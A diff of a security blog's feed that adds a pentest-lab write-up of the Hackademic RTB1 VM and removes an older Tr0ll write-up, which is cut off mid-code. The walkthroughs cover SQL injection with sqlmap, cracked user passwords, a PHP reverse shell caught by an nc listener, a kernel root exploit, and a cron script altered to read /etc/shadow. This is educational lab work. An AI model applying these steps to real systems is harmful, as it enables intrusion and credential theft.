@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2016-06-14T07:35:21-04:00</updated>
+  <updated>2016-07-18T12:57:26-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,260 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
+    <link href="http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1/"/>
+    <updated>2016-07-18T09:00:59-04:00</updated>
+    <id>http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1</id>
+    <content type="html"><![CDATA[<h1>Mission statement</h1>
+
+<p>Get root and read the contents of the file &lsquo;key.txt&rsquo; in the root directory.</p>
+
+<!-- more -->
+
+
+<h1>Recon</h1>
+
+<p>I started with a port scan of the target, but only the 80 port is open:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-web.png" title="hackademic" alt="hackademic website"></p>
+
+<p>I looked at the links and noticed the URL for the post is <a href="http://192.168.80.162/Hackademic_RTB1/?p=9">http://192.168.80.162/Hackademic_RTB1/?p=9</a> and for the archives is <a href="http://192.168.80.162/Hackademic_RTB1/?cat=1">http://192.168.80.162/Hackademic_RTB1/?cat=1</a> . Before going to Sqlmap, I manually inserted quotes in the URLs and sure enough, a SQL error for the cat parameter:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-sqli.png" title="sqli" alt="sql error"></p>
+
+<h1>Exploit</h1>
+
+<p>Next I enumerated the databases with Sqlmap:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL --dbs
+</span><span class='line'>available databases [3]:
+</span><span class='line'>[*] information_schema
+</span><span class='line'>[*] mysql
+</span><span class='line'>[*] wordpress</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since this is a web-based challenge, I proceeded to look into the wordpress database:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL -D wordpress --tables
+</span><span class='line'>Database: wordpress
+</span><span class='line'>[9 tables]
+</span><span class='line'>+-------------------+
+</span><span class='line'>| wp_categories     |
+</span><span class='line'>| wp_comments       |
+</span><span class='line'>| wp_linkcategories |
+</span><span class='line'>| wp_links          |
+</span><span class='line'>| wp_options        |
+</span><span class='line'>| wp_post2cat       |
+</span><span class='line'>| wp_postmeta       |
+</span><span class='line'>| wp_posts          |
+</span><span class='line'>| wp_users          |
+</span><span class='line'>+-------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I further enumerated the wp_users table and here I am showing only the relevant information:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user_pass                user_login
+</span><span class='line'>21232f297a57a5a743894a0e4a801fc3  NickJames
+</span><span class='line'>b986448f0bb9e5e124ca91d3d650f52c  JohnSmith
+</span><span class='line'>7cbb3252ba6b7e9c422fac5334d22054  GeorgeMiller
+</span><span class='line'>a6e514f9486b83cb53d8d932f9a04292  TonyBlack
+</span><span class='line'>8601f6e1028a8e8a966f6c33fcd9aec4  JasonKonnors
+</span><span class='line'>50484c19f1afdaf3841a0d821ed393d2  MaxBucky</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cracking the hashes revealed the passwords of all the users:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>admin
+</span><span class='line'>PUPPIES
+</span><span class='line'>q1w2e3
+</span><span class='line'>napoleon
+</span><span class='line'>maxwell
+</span><span class='line'>kernel</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I went to the Wordpress login page at <a href="http://192.168.80.162/Hackademic_RTB1/wp-login.php">http://192.168.80.162/Hackademic_RTB1/wp-login.php</a> and logged in as NickJames (assumed he was admin because of his password). But there was nothing extraordinary to be done with his privileges, just adding and editing posts. We have more users to try  though! When I reached GeorgeMiller, I noticed there were more actions available in the admin panel:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-panel.png" title="dashboard" alt="admin panel"></p>
+
+<p>In the Presentation tab I could edit themes for the site. I picked the 404.php file and replaced its content with a line that would echo something first, so I don&rsquo;t waste my time with shells without checking if code is executed successfully.</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-404.png" title="404.php" alt="php file edited"></p>
+
+<p>When I went to the <a href="http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php">http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php</a> URL, I saw RCE displayed, so next I used the now-familiar reverse PHP shell from pentestmonkey. Set up my listener and visited the URL again to receive the shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 5555
+</span><span class='line'>listening on [any] 5555 ...
+</span><span class='line'>connect to [192.168.80.161] from (UNKNOWN) [192.168.80.162] 50723
+</span><span class='line'>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+</span><span class='line'> 13:23:45 up  3:04,  0 users,  load average: 0.00, 0.00, 0.00
+</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>uid=48(apache) gid=489(apache) groups=489(apache)
+</span><span class='line'>sh: no job control in this shell</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Privilege escalation</h2>
+
+<p>The shell kept echoing back the commands I was running but otherwise it worked fine. I didn&rsquo;t find anything interesting that I could use during local enumeration, so I then searched for privilege escalation exploits that might apply to the kernel version 2.6.31 found on the box. The exploit that worked was the <a href="https://www.exploit-db.com/exploits/15285/">RDS privilege escalation exploit</a> by Dan Rosenberg. You can also find it on Kali with Searchsploit. I compiled it on my machine with the <em>-m32</em> flag for the target architecture and transfered it via netcat. Then I ran it and I stared a bit at the blinking cursor before confirming that it gave me root:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.0$ ./rds
+</span><span class='line'>./rds
+</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+</span><span class='line'>[*] by Dan Rosenberg
+</span><span class='line'>[*] Resolving kernel addresses...
+</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
+</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
+</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
+</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
+</span><span class='line'>[*] Overwriting security ops...
+</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+</span><span class='line'>[*] by Dan Rosenberg
+</span><span class='line'>[*] Resolving kernel addresses...
+</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
+</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
+</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
+</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
+</span><span class='line'>[*] Overwriting security ops...
+</span><span class='line'>[*] Overwriting function pointer...
+</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+</span><span class='line'>[*] by Dan Rosenberg
+</span><span class='line'>[*] Resolving kernel addresses...
+</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
+</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
+</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
+</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
+</span><span class='line'>[*] Overwriting security ops...
+</span><span class='line'>[*] Overwriting function pointer...
+</span><span class='line'>[*] Triggering payload...
+</span><span class='line'>[*] Restoring function pointer...
+</span><span class='line'>id
+</span><span class='line'>uid=0(root) gid=0(root)
+</span><span class='line'>cat /root/key.txt
+</span><span class='line'>Yeah!!
+</span><span class='line'>You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)
+</span><span class='line'>
+</span><span class='line'>$_d&jgQ&gt;&gt;ak\#b"(Hx"o&lt;la_%
+</span><span class='line'>
+</span><span class='line'>Regards,
+</span><span class='line'>mr.pr0n || p0wnbox.Team || 2011
+</span><span class='line'>http://p0wnbox.com</span></code></pre></td></tr></table></div></figure>
+
+
+<h1>Debriefing</h1>
+
+<p>The machine looked pretty tightly locked with only a web server running. But the WordPress version was contained a known SQLi exploit that handed down the hashes for the users. One user had the rights to upload code on the server and facilitated geting (limited) access on the target. The kernel was vulnerable to a local root exploit, and from there it was game over.</p>
+
+<p>GG, nice VM! Now let&rsquo;s end with some wisdom straight from the cow&rsquo;s mouth:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/ Don't relax! It's only your tension \
+</span><span class='line'>\ that's holding you together.        /
+</span><span class='line'> -------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - Drunk Admin Web Hacking Challenge]]></title>
@@ -21238,565 +21492,6 @@ the secure channel, and a connection is made to <strong>host</strong> port
 <p><img class="center" src="http://chousensha.github.io/images/pentest/secos/win.png" title="flag" alt="flag"></p>
 
 <blockquote><p>Don&rsquo;t tell any big lies today.  Small ones can be just as effective.</p></blockquote>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Tr0ll]]></title>
-    <link href="http://chousensha.github.io/blog/2014/11/30/pentest-lab-tr0ll/"/>
-    <updated>2014-11-30T01:48:14-05:00</updated>
-    <id>http://chousensha.github.io/blog/2014/11/30/pentest-lab-tr0ll</id>
-    <content type="html"><![CDATA[<p>Next in my lab series will be another machine from VulnHub:</p>
-
-<blockquote><p>Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.</p>
-
-<p>The goal is simple, gain root and get Proof.txt from the /root directory.</p>
-
-<p>Not for the easily frustrated! Fair warning, there be trolls ahead!</p></blockquote>
-
-<!-- more -->
-
-
-<p>As always, I start with a guns blazing Nmap scan:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.80.134
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-11-30 08:55 EET
-</span><span class='line'>Nmap scan report for 192.168.80.134
-</span><span class='line'>Host is up (0.00086s latency).
-</span><span class='line'>Not shown: 65532 closed ports
-</span><span class='line'>PORT   STATE SERVICE VERSION
-</span><span class='line'>21/tcp open  ftp     vsftpd 3.0.2
-</span><span class='line'>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-</span><span class='line'>|_-rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap [NSE: writeable]
-</span><span class='line'>22/tcp open  ssh     (protocol 2.0)
-</span><span class='line'>| ssh-hostkey: 
-</span><span class='line'>|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
-</span><span class='line'>|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
-</span><span class='line'>|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
-</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
-</span><span class='line'>| http-robots.txt: 1 disallowed entry 
-</span><span class='line'>|_/secret
-</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
-</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
-</span><span class='line'>SF-Port22-TCP:V=6.47%I=7%D=11/30%Time=547ABF60%P=x86_64-unknown-linux-gnu%
-</span><span class='line'>SF:r(NULL,29,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n");
-</span><span class='line'>MAC Address: 00:0C:29:F8:CC:3D (VMware)
-</span><span class='line'>Device type: general purpose
-</span><span class='line'>Running: Linux 3.X
-</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
-</span><span class='line'>OS details: Linux 3.11 - 3.14
-</span><span class='line'>Network Distance: 1 hop
-</span><span class='line'>Service Info: OS: Unix
-</span><span class='line'>
-</span><span class='line'>TRACEROUTE
-</span><span class='line'>HOP RTT     ADDRESS
-</span><span class='line'>1   0.86 ms 192.168.80.134
-</span><span class='line'>
-</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Not an awful lot to start with. First thing, I checked what&rsquo;s being served on port 80, and of course, there was a troll:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll/troll1.png" title="troll" alt="troll"></p>
-
-<p>The &ldquo;secret&rdquo; doesn&rsquo;t help much either, other than potentially hinting at the use of steganography, which I am very bad at.</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll/troll2.png" title="troll2" alt="troll2"></p>
-
-<p>I also searched for a vsftpd exploit suitable to the 3.0.2 version, which I couldn&rsquo;t find. So before trying to search for hidden data that might not even exist inside the images, and even if it does, I wouldn&rsquo;t be able to find it anyway, I&rsquo;m going to see if there is anything interesting lying around the FTP server.</p>
-
-<p>Logging in with the <em>anonymous/anonymous</em> credentials, I see there is a pcap file waiting:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; ls
-</span><span class='line'>200 PORT command successful. Consider using PASV.
-</span><span class='line'>150 Here comes the directory listing.
-</span><span class='line'>-rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap
-</span><span class='line'>226 Directory send OK.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I downloaded it to my machine so I can check it out with Wireshark:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; get lol.pcap
-</span><span class='line'>local: lol.pcap remote: lol.pcap
-</span><span class='line'>200 PORT command successful. Consider using PASV.
-</span><span class='line'>150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
-</span><span class='line'>226 Transfer complete.
-</span><span class='line'>8068 bytes received in 0.05 secs (148.1 kB/s)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Scanning through the packets I noticed something interesting:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll/wireshark.png" title="secret stuff" alt="secret stuff"></p>
-
-<p>And when following the stream, even more interesting tidbits:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll/stream.png" title="TCP stream" alt="tcp stream"></p>
-
-<p>So why don&rsquo;t we see the secret stuff for ourselves! In order to see what&rsquo;s inside the secret file, I looked at the FTP-DATA packet that comes after requesting the transfer. I highlighted it below and you can see it&rsquo;s the correct size (147 bytes):</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll/ftpdata.png" title="ftp data" alt="ftp data"></p>
-
-<p>If you follow the stream you will see this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
-</span><span class='line'>
-</span><span class='line'>Sucks, you were so close... gotta TRY HARDER!</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Finally, some progress! As an aside, this information could also be obtained just by running <em>strings</em> on the pcap file. Now let&rsquo;s go back to the browser and see what&rsquo;s inside that directory. To keep up with the troll theme, there&rsquo;s a BIN file named roflmao. Again I felt a little discouraged because I have only a rudimentary grasp of binary analysis and reverse engineering at the moment. Running <em>strings</em> on it, the only interesting thing I noticed was this line:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Find address 0x0856BF to proceed</span></code></pre></td></tr></table></div></figure>
-
-
-<p>If you run it (make it executable or you will get a permission denied error), you will see that it only prints the above line and exits. Time for GDB!</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Dump of assembler code for function main:
-</span><span class='line'>   0x0804841d &lt;+0&gt;: push   ebp
-</span><span class='line'>   0x0804841e &lt;+1&gt;: mov    ebp,esp
-</span><span class='line'>   0x08048420 &lt;+3&gt;: and    esp,0xfffffff0
-</span><span class='line'>   0x08048423 &lt;+6&gt;: sub    esp,0x10
-</span><span class='line'>   0x08048426 &lt;+9&gt;: mov    DWORD PTR [esp],0x80484d0
-</span><span class='line'>   0x0804842d &lt;+16&gt;:    call   0x80482f0 &lt;printf@plt&gt;
-</span><span class='line'>   0x08048432 &lt;+21&gt;:    leave  
-</span><span class='line'>   0x08048433 &lt;+22&gt;:    ret   </span></code></pre></td></tr></table></div></figure>
-
-
-<p>I looked around as much as I could, but the program is a really small one and I could find nothing hidden. Also the address didn&rsquo;t seem to fit in with any of the memory addresses inside the binary, so I thought maybe it&rsquo;s just a hint for continuing elsewhere. The only place that came to mind was to try for another hidden directory on the web server:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll/0856bf.png" title="hidden" alt="win"></p>
-
-<p>Woohoo! We&rsquo;re on the right track. Now it seems both directories contain a text file with..users and a password?</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll/which_one.png" title="passwords" alt="which pass"></p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll/gj.png" title="good job" alt="gj"></p>
-
-<p>I tried connecting to SSH using the password in the Pass.txt files and usernames from the other file. Then I also tried to connect as root, troll, tr0ll, using everything in the lists as password. Manually.. Anyway, when nothing worked, I had to take a break and think that it&rsquo;s most likely trolling me, as it did in all the previous steps. So, looking at the directory index, it&rsquo;s apparent that one folder contains the password and the other one a list with potential usernames, from which you have to find the correct one to go with the password. But since I&rsquo;ve already tried that and failed, I didn&rsquo;t know what else to do. Now, the Pass.txt file contained a good job message that seemed to be the actual password, but maybe it was just a normal good job..implying that I already found the password. So I tried SSH again, this time using Pass as password..and when that didn&rsquo;t work, even which_one_lol. This was more wasted effort, so lastly, I literally used the name of the file as password: Pass.txt. And! Combining it with the overflow user&hellip;success!! Now I started looking around, but before I could find anything, I&rsquo;ve been booted by the shell?!</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Broadcast Message from root@trol                                               
-</span><span class='line'>        (somewhere) at 5:45 ...                                                
-</span><span class='line'>                                                                               
-</span><span class='line'>TIMES UP LOL!                                                                  
-</span><span class='line'>                                                                               
-</span><span class='line'>Connection to 192.168.80.134 closed by remote host.
-</span><span class='line'>Connection to 192.168.80.134 closed.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After more logins, it appears the shell is killed every few minutes. So, this troll might be playing with cron. The only other lead I had so far was a file named <em>lmao.py</em> in the <code>/opt/</code>, but I didn&rsquo;t have permission to read it. I took a look in the <code>/var/log</code> directory:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls /var/log
-</span><span class='line'>alternatives.log    cronlog     fail2ban.log    udev
-</span><span class='line'>alternatives.log.1  dist-upgrade  fail2ban.log.1  upstart
-</span><span class='line'>apache2           dmesg     faillog     vmware-tools-upgrader.log
-</span><span class='line'>apt           dmesg.0   fsck        vsftpd.log
-</span><span class='line'>auth.log      dmesg.1.gz    installer   vsftpd.log.1
-</span><span class='line'>auth.log.1        dmesg.2.gz    kern.log    wtmp
-</span><span class='line'>boot.log      dmesg.3.gz    kern.log.1      wtmp.1
-</span><span class='line'>bootstrap.log     dmesg.4.gz    lastlog
-</span><span class='line'>btmp          dpkg.log      syslog
-</span><span class='line'>btmp.1            dpkg.log.1    syslog.1
-</span><span class='line'>$ cd /var/log
-</span><span class='line'>$ cat cronlog
-</span><span class='line'>*/2 * * * * cleaner.py</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So, that cleaner.py file seems to be a likely culprit. I searched for it and I found something interesting:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ locate cleaner.py
-</span><span class='line'>/lib/log/cleaner.py
-</span><span class='line'>/var/tmp/cleaner.py.swp
-</span><span class='line'>$ cat /lib/log/cleaner.py
-</span><span class='line'>#!/usr/bin/env python
-</span><span class='line'>import os
-</span><span class='line'>import sys
-</span><span class='line'>try:
-</span><span class='line'>  os.system('rm -r /tmp/* ')
-</span><span class='line'>except:
-</span><span class='line'>  sys.exit()
-</span><span class='line'>$ cat /var/tmp/cleaner.py.swp
-</span><span class='line'>crontab for cleaner.py successful</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Ok, so this cleaner deletes all the contents of the <code>/tmp/</code> folder. The great part about it though, is the wonderful permissions it has:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -l /lib/log/cleaner.py
-</span><span class='line'>-rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So we can modify it to help in compromising the system. First thing I did was add the following code to copy the contents of the <code>/etc/shadow</code> file to a txt file in the <em>/tmp/</em> folder:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/etc/shadow&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">shadow</span><span class="p">:</span>
-</span><span class='line'>    <span class="n">juicy</span> <span class="o">=</span> <span class="n">shadow</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
